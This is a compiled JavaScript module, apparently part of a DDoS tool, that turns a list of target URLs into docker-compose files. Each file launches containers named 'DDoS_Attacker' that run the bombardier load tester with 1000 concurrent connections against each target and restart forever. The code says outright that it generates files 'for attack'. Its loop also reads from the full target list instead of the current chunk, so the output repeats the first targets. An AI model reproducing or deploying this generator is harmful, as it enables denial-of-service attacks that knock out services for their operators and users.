"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.FileGenerator = void 0;
var fs_1 = __importDefault(require("fs"));
var lodash_1 = __importDefault(require("lodash"));
/**
 * This is used to generate and save file for attack;
 *
 * Tabs are not supported by .yml files
 */
var FileGenerator = /** @class */ (function () {
    function FileGenerator(options) {
        this.targets = [];
        this.countPerChunk = 10; //Count of targets per docker-file
        this.SAVE_DIR = 'attackTargets/lists';
        this.FILE_NAME = 'docker-compose.yml';
        this.LISTS_COUNT_FILE_NAME = 'lists_count.txt';
        this.targets = options.targets;
    }
    FileGenerator.prototype.generateAndSave = function () {
        var _this = this;
        var chunks = lodash_1.default.chunk(this.targets, this.countPerChunk);
        chunks.forEach(function (chunk, chunkIndex) {
            var directory = _this.SAVE_DIR + "/list_".concat(chunkIndex);
            var filepath = "".concat(directory, "/") + _this.FILE_NAME;
            var fileContent = "";
            fileContent += "version: \"3.9\"\n";
            fileContent += "services:\n";
            for (var i = 0; i < chunk.length; i++) {
                fileContent += "   s".concat(i, ":\n");
                fileContent += "      image: alpine/bombardier\n";
                fileContent += "      container_name: \"DDoS_Attacker_".concat(i, "\"\n");
                fileContent += "      command: [ \"-c\", \"1000\", \"-d\", \"60s\", \"-l\", \"".concat(_this.targets[i], "\" ]\n");
                fileContent += "      restart: \"always\"\n";
            }
            console.log('Saving into file: ', filepath);
            // Remove old files
            fs_1.default.rm(_this.SAVE_DIR, { recursive: true }, function () {
                fs_1.default.mkdir(_this.SAVE_DIR, { recursive: true }, function () {
                    // Creates directory if it is missing
                    fs_1.default.mkdir(directory, { recursive: true }, function (err) {
                        if (err)
                            throw err;
                        //Save file
                        fs_1.default.writeFileSync(filepath, fileContent);
                    });
                    var countFileContent = "".concat(chunks.length);
                    fs_1.default.writeFileSync("".concat(_this.SAVE_DIR, "/").concat(_this.LISTS_COUNT_FILE_NAME), countFileContent);
                });
            });
        });
    };
    return FileGenerator;
}());
exports.FileGenerator = FileGenerator;
